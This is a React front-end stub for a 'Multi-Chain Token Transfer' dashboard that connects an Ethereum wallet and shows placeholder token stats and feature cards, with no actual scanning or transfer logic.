import { useState, useEffect } from 'react';

function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');
  const [status, setStatus] = useState('Ready to connect');

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        setAddress(accounts[0]);
        setIsConnected(true);
        setStatus('✅ Wallet connected');
      } catch (error) {
        setStatus('❌ Connection failed');
      }
    } else {
      setStatus('❌ No Ethereum wallet found');
    }
  };

  const disconnectWallet = () => {
    setAddress('');
    setIsConnected(false);
    setStatus('Ready to connect');
  };

  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
      color: 'white',
      fontFamily: 'system-ui, -apple-system, sans-serif',
      padding: '20px'
    }}>
      <div style={{ maxWidth: '1200px', margin: '0 auto' }}>
        <header style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          padding: '20px 0',
          borderBottom: '1px solid #333',
          marginBottom: '30px'
        }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
            <div style={{
              width: '40px',
              height: '40px',
              background: '#ef4444',
              borderRadius: '10px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '24px'
            }}>🚀</div>
            <div>
              <h1 style={{ margin: 0, fontSize: '24px', color: '#ef4444' }}>
                TOKEN TRANSFER
              </h1>
              <p style={{ margin: '5px 0 0 0', color: '#888', fontSize: '14px' }}>
                Multi-Chain • Auto Transfer
              </p>
            </div>
          </div>
          
          <div>
            {isConnected ? (
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '15px',
                background: '#222',
                padding: '10px 15px',
                borderRadius: '12px',
                border: '1px solid #333'
              }}>
                <div>
                  <div style={{
                    fontFamily: "'Roboto Mono', monospace",
                    fontSize: '14px',
                    fontWeight: '500'
                  }}>
                    {address.substring(0, 6)}...{address.substring(address.length - 4)}
                  </div>
                </div>
                <button
                  onClick={disconnectWallet}
                  style={{
                    background: '#444',
                    color: 'white',
                    border: 'none',
                    padding: '8px 16px',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    fontSize: '14px'
                  }}
                >
                  Disconnect
                </button>
              </div>
            ) : (
              <button
                onClick={connectWallet}
                style={{
                  background: 'linear-gradient(135deg, #ef4444, #dc2626)',
                  color: 'white',
                  border: 'none',
                  padding: '14px 28px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px'
                }}
              >
                <span>🔗</span>
                <span>Connect Wallet</span>
              </button>
            )}
          </div>
        </header>

        <main>
          {isConnected ? (
            <div>
              <div style={{
                background: 'linear-gradient(135deg, #1e3a8a, #3b82f6)',
                borderRadius: '16px',
                padding: '25px',
                marginBottom: '20px'
              }}>
                <div style={{ fontSize: '14px', color: 'rgba(255,255,255,0.9)', marginBottom: '8px' }}>
                  SYSTEM STATUS
                </div>
                <div style={{ fontSize: '20px', fontWeight: '700' }}>
                  {status}
                </div>
              </div>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(4, 1fr)',
                gap: '15px',
                marginBottom: '30px'
              }}>
                <div style={{
                  background: '#222',
                  borderRadius: '12px',
                  padding: '20px',
                  textAlign: 'center',
                  border: '1px solid #333'
                }}>
                  <div style={{ fontSize: '28px', fontWeight: '800', color: '#ef4444' }}>
                    $0.00
                  </div>
                  <div style={{ color: '#888', fontSize: '13px' }}>
                    Total Value
                  </div>
                </div>
                <div style={{
                  background: '#222',
                  borderRadius: '12px',
                  padding: '20px',
                  textAlign: 'center',
                  border: '1px solid #333'
                }}>
                  <div style={{ fontSize: '28px', fontWeight: '800', color: '#ef4444' }}>
                    0
                  </div>
                  <div style={{ color: '#888', fontSize: '13px' }}>
                    Tokens Found
                  </div>
                </div>
              </div>

              <div style={{
                background: '#222',
                borderRadius: '16px',
                padding: '25px',
                textAlign: 'center'
              }}>
                <div style={{ fontSize: '20px', fontWeight: '700', marginBottom: '10px' }}>
                  No Tokens Found
                </div>
                <p style={{ color: '#888', marginBottom: '20px' }}>
                  Connect your wallet to scan for tokens across multiple networks.
                </p>
                <button
                  style={{
                    background: 'linear-gradient(135deg, #1e40af, #3b82f6)',
                    color: 'white',
                    border: 'none',
                    padding: '12px 24px',
                    borderRadius: '12px',
                    fontSize: '16px',
                    fontWeight: '600',
                    cursor: 'pointer'
                  }}
                >
                  🔍 Scan Networks
                </button>
              </div>
            </div>
          ) : (
            <div style={{ textAlign: 'center', padding: '60px 20px' }}>
              <div style={{ fontSize: '80px', marginBottom: '20px' }}>🚀</div>
              <h2 style={{ fontSize: '32px', marginBottom: '20px' }}>
                Multi-Chain Token Transfer
              </h2>
              <p style={{ color: '#ddd', fontSize: '18px', maxWidth: '600px', margin: '0 auto 40px' }}>
                Connect your Web3 wallet to automatically scan and transfer tokens
                across multiple EVM networks using secure smart contracts.
              </p>
              
              <button
                onClick={connectWallet}
                style={{
                  background: 'linear-gradient(135deg, #ef4444, #dc2626)',
                  color: 'white',
                  border: 'none',
                  padding: '18px 36px',
                  borderRadius: '12px',
                  fontSize: '18px',
                  fontWeight: '600',
                  cursor: 'pointer',
                  marginBottom: '60px'
                }}
              >
                🔗 Connect Web3 Wallet
              </button>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
                gap: '20px',
                marginTop: '40px'
              }}>
                <div style={{
                  background: '#222',
                  borderRadius: '16px',
                  padding: '25px 20px',
                  textAlign: 'center',
                  border: '1px solid #333'
                }}>
                  <div style={{ fontSize: '32px', marginBottom: '15px' }}>🔍</div>
                  <div style={{ fontSize: '18px', fontWeight: '600', marginBottom: '8px' }}>
                    Auto Scan
                  </div>
                  <div style={{ color: '#888', fontSize: '14px' }}>
                    Scans all EVM networks instantly
                  </div>
                </div>
                <div style={{
                  background: '#222',
                  borderRadius: '16px',
                  padding: '25px 20px',
                  textAlign: 'center',
                  border: '1px solid #333'
                }}>
                  <div style={{ fontSize: '32px', marginBottom: '15px' }}>⚡</div>
                  <div style={{ fontSize: '18px', fontWeight: '600', marginBottom: '8px' }}>
                    Smart Contracts
                  </div>
                  <div style={{ color: '#888', fontSize: '14px' }}>
                    Secure automated transfers
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer style={{
          marginTop: '40px',
          paddingTop: '20px',
          borderTop: '1px solid #333',
          textAlign: 'center',
          color: '#888',
          fontSize: '14px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'center', gap: '10px' }}>
            <span>Token Transfer v1.0</span>
            <span>•</span>
            <span>Ready to Deploy</span>
          </div>
        </footer>
      </div>
    </div>
  );
}

export default App;
